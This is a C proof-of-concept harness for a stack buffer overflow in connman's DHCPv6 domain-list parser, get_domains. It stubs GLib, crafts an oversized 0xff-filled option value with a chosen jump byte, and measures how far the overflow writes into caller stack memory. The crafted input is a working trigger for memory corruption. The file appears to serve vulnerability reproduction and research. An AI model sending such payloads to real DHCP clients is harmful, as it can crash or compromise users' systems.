/*
 * Direct-call harness for CVE-2026-115863 / GHSA-725f-6r9j-c4hf.
 * get_domains_fn.inc is extracted verbatim from a pinned gdhcp/client.c by
 * run.sh. This file supplies only NS_MAXDNAME and GLib stubs. No connman
 * build, no DHCPv6 socket, no network, no daemon.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NS_MAXDNAME 1025

typedef struct GList {
	void *data;
	struct GList *next;
	struct GList *prev;
} GList;

static GList *g_list_prepend(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n));
	if (!n) exit(91);
	n->data = data;
	n->next = list;
	n->prev = NULL;
	if (list) list->prev = n;
	return n;
}

static GList *g_list_reverse(GList *list)
{
	GList *prev = NULL, *cur = list;
	while (cur) {
		GList *next = cur->next;
		cur->next = prev;
		cur->prev = next;
		prev = cur;
		cur = next;
	}
	return prev;
}

static char *g_strdup(const char *s)
{
	size_t n = strlen(s) + 1;
	char *p = malloc(n);
	if (!p) exit(92);
	memcpy(p, s, n);
	return p;
}

static void free_list(GList *list)
{
	while (list) {
		GList *next = list->next;
		free(list->data);
		free(list);
		list = next;
	}
}

#include "get_domains_fn.inc"

#define MAXLEN 2048
static unsigned char value[MAXLEN];

static void craft(int lastjump)
{
	memset(value, 0xff, sizeof(value));
	value[MAXLEN - 1] = 0x00;
	value[1024] = (unsigned char)lastjump;
}

static void craft_safe(void)
{
	/* two valid DNS labels then a terminator */
	memset(value, 0, sizeof(value));
	value[0] = 3; value[1] = 'a'; value[2] = 'b'; value[3] = 'c';
	value[4] = 3; value[5] = 'd'; value[6] = 'e'; value[7] = 'f';
}

#ifndef PLAIN
int main(int argc, char **argv)
{
	int attack = (argc < 2 || strcmp(argv[1], "attack") == 0);
	int lastjump = 0x20;
	if (argc >= 3) lastjump = (int)strtol(argv[2], NULL, 0);

	if (attack) craft(lastjump); else craft_safe();

	int usedlen = attack ? MAXLEN : 8;
	printf("USEDLEN=%d LASTJUMP=%02x FIRST_OOB_OFFSET=%d\n",
	       usedlen, lastjump, attack ? lastjump - 1 : -1);
	fflush(stdout);

	GList *list = get_domains(usedlen, value);
	int n = 0;
	for (GList *p = list; p; p = p->next) n++;
	printf("RC=0 LIST_LEN=%d\n", n);
	free_list(list);
	return 0;
}
#else
int main(int argc, char **argv)
{
	int lastjump = (argc >= 2) ? (int)strtol(argv[1], NULL, 0) : 0x80;
	craft(lastjump);
	printf("PLAIN LASTJUMP=%02x\n", lastjump);
	fflush(stdout);

	/* Fill a broad caller-frame region; the overflow walks upward from
	 * get_domains()'s dns_name[] into caller stack memory. */
	volatile unsigned char fill[16384];
	for (int i = 0; i < (int)sizeof(fill); i++) fill[i] = 0xee;

	GList *list = get_domains(MAXLEN, value);
	free_list(list);
	(void)list;

	int dots = 0, first = -1, last = -1;
	for (int i = 0; i < (int)sizeof(fill); i++) {
		if (fill[i] == 0x2e) {
			dots++;
			if (first < 0) first = i;
			last = i;
		}
	}
	printf("CANARY DOTS=%d FIRST=%d LAST=%d FILLBASE=%p\n",
	       dots, first, last, (void *)(uintptr_t)fill);
	return 0;
}
#endif
